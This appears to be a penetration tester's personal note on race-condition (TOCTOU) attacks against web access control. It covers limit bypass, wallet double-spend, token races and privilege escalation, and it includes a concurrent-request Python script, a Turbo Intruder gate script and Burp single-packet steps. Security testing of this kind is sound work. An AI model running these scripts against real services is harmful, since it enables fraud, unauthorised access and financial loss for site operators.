---
tags: [bac, attack, race-condition, toctou, concurrent]
type: attack
severity: high
date: 2026-03-10
---

# 🏁 Race Condition BAC — Concurrent Request Exploitation

## Why Race Conditions Break Access Control
Access control checks and state transitions are **not atomic** in most web apps. Between the "check" (can this user do X?) and the "use" (do X), there's a window. Send enough concurrent requests and you can slip through that window — bypassing limits, consuming free resources, or gaining unauthorized access.

```
TOCTOU — Time of Check, Time of Use:

Normal:  CHECK (authorized?) ──► USE (execute action)

Attack:  CHECK ──► [exploit this window] ──► USE ──► USE ──► USE
         thread1 passes check
                              thread2 passes check (same state!)
                                             both execute!
```

---

## Attack Class 1: Limit Bypass (Free → Paid Access)

```
Target: One free trial per account
Normal: Trial activated → flag set → second attempt blocked

Race:
  Send 50 concurrent POST /api/trial/activate requests
  Some requests pass the "trial_used = false" check simultaneously
  All of them set trial_used = true AND grant trial access
  Result: trial granted multiple times, or in parallel subscriptions

Real-world targets:
  - One free tier per account (AI credits, storage quotas)
  - One-time discount codes (50 concurrent requests = 50 uses)
  - Invite link single-use bypass
  - Rate-limited SMS/email verification sends
```

```python
#!/usr/bin/env python3
"""Race condition tester — concurrent request sender"""
import asyncio, aiohttp, time

TARGET  = "https://target.com/api/trial/activate"
TOKEN   = "Bearer YOUR_TOKEN"
THREADS = 50

async def send_request(session, i):
    headers = {"Authorization": TOKEN, "Content-Type": "application/json"}
    async with session.post(TARGET, headers=headers, json={}) as resp:
        body = await resp.text()
        print(f"[{i:03d}] {resp.status} | {body[:80]}")

async def race():
    async with aiohttp.ClientSession() as session:
        # Warm up: pre-create all coroutines
        tasks = [send_request(session, i) for i in range(THREADS)]
        # Fire all simultaneously
        t0 = time.time()
        await asyncio.gather(*tasks)
        print(f"\n[*] {THREADS} requests sent in {time.time()-t0:.3f}s")

asyncio.run(race())
```

---

## Attack Class 2: Double-Spend (Financial Race)

```
Target: /api/wallet/withdraw  (balance check → debit)
Normal: Balance $100 → withdraw $100 → balance $0 → second withdraw blocked

Race:
  Send 5 concurrent withdrawals of $100 each
  All 5 read balance=$100 before any debit completes
  All 5 pass the "balance >= amount" check
  All 5 debit $100 → balance = -$400

Requires:
  - Non-atomic read-check-write
  - No database-level locking (SELECT FOR UPDATE)
  - No application-level mutex

Real targets: crypto wallets, gift card redemption, refund processing
```

---

## Attack Class 3: IDOR + Race = State Confusion

```
Target: Order cancellation (only PENDING orders can be cancelled by user)
Normal: PENDING → cancel → CANCELLED
Attack: 
  Thread 1: PUT /api/order/1337 {"status":"SHIPPED"}  (requires admin, gets 403)
  Thread 2: POST /api/order/1337/cancel              (user action, allowed if PENDING)
  
  If both hit simultaneously:
    → DB reads PENDING for both
    → Thread 2 cancels (sets CANCELLED)
    → Thread 1 updates to SHIPPED (race wins)
    → Order shows as SHIPPED despite being "cancelled" + refund issued

More impactful variant:
  Race a refund request with a re-ship request
  → Get refund AND receive goods
```

---

## Attack Class 4: Concurrent Account Operations

```
Target: Email change confirmation (one active token at a time)

Normal:
  Request change → token A sent → confirm A → email changed

Race:
  Request 10 concurrent changes to different emails
  All 10 get tokens
  Confirm any one → all others still valid (race condition in invalidation)
  Or: confirm two simultaneously → account in undefined state

Target: Password reset
  Request 10 concurrent password resets
  Each gets a token
  Use all 10 simultaneously → may all work if invalidation races
```

---

## Attack Class 5: Privilege Escalation via Race

```
Target: Admin approval workflow
  User requests admin → status=PENDING → admin approves → status=ADMIN

Normal:
  approval action guarded: only process if status=PENDING

Race:
  Admin approves legitimate request
  Simultaneously, attacker's account makes 50 requests with 
  the approval token → all 50 process before status updates
  → Multiple role grants / undefined final state

Or: Two different approvals race the same token
  → Both accounts elevated (token not invalidated atomically)
```

---

## Burp Suite — Turbo Intruder Race Attack

```python
# Turbo Intruder race condition script
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=1,
        pipeline=False
    )
    # Queue all requests with gate (release simultaneously)
    for i in range(50):
        engine.queue(target.req, gate='race')
    
    # Open the gate — fire all 50 at once
    engine.openGate('race')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

---

## Burp Suite — Single-Packet Attack (HTTP/2)

```
HTTP/2 allows multiple requests in a single TCP packet.
This eliminates network jitter — requests arrive at server simultaneously.

In Burp Repeater:
1. Set up your request tab
2. Duplicate it 20 times (Ctrl+click, select all, right-click → Send in group)
3. Set "Send mode" = "Send group in parallel (last-byte sync)"
4. This uses HTTP/2 single-packet technique
→ Most reliable race condition testing method available

Works on: Any HTTP/2 endpoint (most modern apps)
```

---

## Finding Race Condition Targets

```
High-value targets for race conditions:
  ✓ /api/*/activate        ← one-time activations
  ✓ /api/*/redeem          ← voucher/coupon redemption
  ✓ /api/*/withdraw        ← wallet/balance operations
  ✓ /api/*/refund          ← refund processing
  ✓ /api/*/cancel          ← cancellation + refund combos
  ✓ /api/*/transfer        ← account-to-account transfers
  ✓ /api/*/verify          ← email/phone verification
  ✓ /api/*/invite          ← single-use invite links
  ✓ /api/*/upgrade         ← subscription upgrades
  ✓ /api/*/claim           ← reward/achievement claiming
  ✓ /api/*/vote            ← voting mechanisms
  ✓ /api/*/like            ← engagement actions with limits
  
Indicators of race condition potential:
  - "Only one per account" restrictions
  - "First come first served" logic
  - Balance/credit checks before debits
  - Status transitions (pending → active → expired)
  - Token invalidation on use
```

---

## Tasks
- [ ] #task Identify all "one per account" or "one-time use" endpoints
- [ ] #task Test single-use codes with 50 concurrent requests
- [ ] #task Test financial operations (withdraw/refund) with concurrent requests
- [ ] #task Set up Turbo Intruder race template on primary targets
- [ ] #task Test HTTP/2 single-packet attack on all race candidates
- [ ] #task Look for balance-check-then-debit patterns (no SELECT FOR UPDATE)

---

## 🔗 Related Notes
- [[Business-Logic-BAC]]
- [[Advanced-BAC-Chains]]
- [[Custom-Scripts]]
- [[Testing-Checklist]]

---
*Tags: #race-condition #toctou #bac #attack #concurrent*
